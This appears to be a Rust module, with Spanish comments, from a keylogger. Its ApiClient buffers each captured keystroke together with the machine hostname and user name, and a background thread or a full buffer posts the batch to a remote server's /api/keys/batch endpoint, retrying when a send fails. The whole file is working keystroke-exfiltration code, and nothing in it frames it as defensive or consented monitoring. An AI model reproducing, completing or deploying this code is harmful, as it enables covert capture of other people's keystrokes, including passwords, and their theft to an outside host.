use reqwest::blocking::Client;
use serde_json::json;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use std::thread;


/// Intervalo de envío en segundos (cada 30 segundos)
const SEND_INTERVAL_SECONDS: u64 = 30;

/// Tamaño máximo del buffer antes de enviar aunque no haya pasado el tiempo
const MAX_BUFFER_SIZE: usize = 50;

//Struct que envia los datos al servidor
pub struct ApiClient {
    client: Client,
    base_url: String,
    buffer: Arc<Mutex<Vec<serde_json::Value>>>,
}

//Metodos de la struct
impl ApiClient {
    pub fn new(base_url: &str) -> Self {
        println!("🌐 ApiClient::new() - base_url: {}", base_url);  // <--- LOG

        let client = ApiClient {
            client: Client::new(),
            base_url: base_url.to_string(),
            buffer: Arc::new(Mutex::new(Vec::new())),
        };

        // Iniciar el hilo que envía periódicamente
        client.start_periodic_sender();
        println!("✅ ApiClient inicializado correctamente");  // <--- LOG

        client
    }

    /// Agrega una tecla al buffer (no envía inmediatamente)
    pub fn add_key(&self, key: &str, timestamp: &str) -> Result<(), Box<dyn std::error::Error>> {
        println!("📝 add_key() - key: '{}'", key);  // <--- LOG

        let machine = hostname::get()?.to_string_lossy().to_string();
        let user = std::env::var("USER")
            .or_else(|_| std::env::var("USERNAME"))
            .unwrap_or_else(|_| "unknown".to_string());

        let entry = json!({
            "key": key,
            "timestamp": timestamp,
            "machine": machine,
            "user": user,
        });

        // Agregar al buffer
        let mut buffer = self.buffer.lock().unwrap();
        buffer.push(entry);
        println!("📊 Buffer actual: {} teclas", buffer.len());  // <--- LOG

        // Si el buffer supera el tamaño máximo, enviar inmediatamente
        if buffer.len() >= MAX_BUFFER_SIZE {
            println!("📤 Buffer lleno, enviando...");  // <--- LOG
            drop(buffer); // Liberar el lock antes de enviar
            let _ = self.flush();
        }

        Ok(())
    }

    /// Envía todos los datos del buffer y lo vacía
    pub fn flush(&self) -> Result<(), Box<dyn std::error::Error>> {
        println!("📤 flush() - iniciando...");  // <--- LOG

        let mut buffer = self.buffer.lock().unwrap();

        if buffer.is_empty() {
            println!("📤 flush() - buffer vacío, nada que enviar");  // <--- LOG
            return Ok(());
        }

        // Tomar los datos y vaciar el buffer
        let data: Vec<serde_json::Value> = buffer.drain(..).collect();
        let count = data.len();

        println!("📤 Enviando {} teclas al servidor...", count);

        let url = format!("{}/api/keys/batch", self.base_url);
        println!("📤 URL: {}", url);  // <--- LOG

        match self.client.post(&url).json(&data).send() {
            Ok(response) => {
                println!("📤 Respuesta recibida: {}", response.status());  // <--- LOG
                if response.status().is_success() {
                    println!("✅ {} teclas enviadas correctamente", count);
                } else {
                    eprintln!("⚠️ Error HTTP: {}", response.status());
                    // Reintentar: devolver los datos al buffer
                    for item in data {
                        buffer.push(item);
                    }
                }
            }
            Err(e) => {
                eprintln!("❌ Error enviando teclas: {}", e);
                // Reintentar: devolver los datos al buffer
                for item in data {
                    buffer.push(item);
                }
            }
        }

        Ok(())
    }

    /// Inicia un hilo que envía el buffer periódicamente
    fn start_periodic_sender(&self) {
        println!("⏰ Iniciando hilo de envío periódico...");  // <--- LOG

        let client = self.clone();
        thread::spawn(move || {
            let interval = Duration::from_secs(SEND_INTERVAL_SECONDS);
            let mut last_send = Instant::now();

            loop {
                thread::sleep(Duration::from_millis(1000)); // Revisar cada segundo

                if last_send.elapsed() >= interval {
                    println!("⏰ Envío periódico...");  // <--- LOG
                    let _ = client.flush();
                    last_send = Instant::now();
                }
            }
        });

        println!("✅ Hilo de envío periódico iniciado");  // <--- LOG
    }
}

// Implementar Clone manualmente porque Arc ya es Clone
impl Clone for ApiClient {
    fn clone(&self) -> Self {
        Self {
            client: self.client.clone(),
            base_url: self.base_url.clone(),
            buffer: Arc::clone(&self.buffer),
        }
    }
}
